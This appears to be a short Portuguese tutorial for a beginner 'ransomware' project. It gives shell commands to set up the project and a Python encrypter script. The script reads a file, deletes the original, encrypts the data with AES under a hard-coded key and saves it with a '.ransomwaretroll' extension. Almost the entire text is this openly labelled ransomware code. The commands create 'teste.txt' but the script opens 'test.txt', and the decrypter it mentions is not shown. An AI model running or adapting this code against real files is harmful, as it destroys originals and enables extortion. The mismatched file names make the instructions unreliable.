Projeto python ransomware;

Comandos

mkdir projeto-ransomware

cd projeto-ransomware

touch teste.txt

touch encrypter.py

touch decrypter.py

nano encrypter.py (vai abrir o editor)

import os

import pyaes

## abrir o arquivo a ser criptografado

file_name = "test.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## remover o arquivo original

os.remove(file_name)

## definir a chave de encriptacao

key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo

crypto_data = aes.encrypt(file_data)

## salvar o arquivo criptografado

new_file = file_name + ".ransomwaretroll"

new_file = open(f'{new_file}','wb')

new_file.write(crypto_data)

new_file.close()

## comandos nano control o para escrever e control x para sair
